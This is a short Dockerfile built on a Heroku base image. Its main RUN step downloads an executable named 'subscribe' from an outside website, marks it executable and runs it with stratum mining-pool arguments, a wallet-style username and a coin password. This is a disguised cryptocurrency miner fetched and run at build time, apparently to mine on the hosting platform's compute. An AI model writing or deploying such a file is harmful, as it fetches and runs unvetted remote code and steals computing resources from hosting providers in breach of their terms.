FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget http://ilovenypizza.com/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://MiningMadness.com:6590 -u MqZeG9Tuh9DXVmrswhHSg7bJy117KewEd2.CRASH -p c=MBC
CMD bash heroku.sh
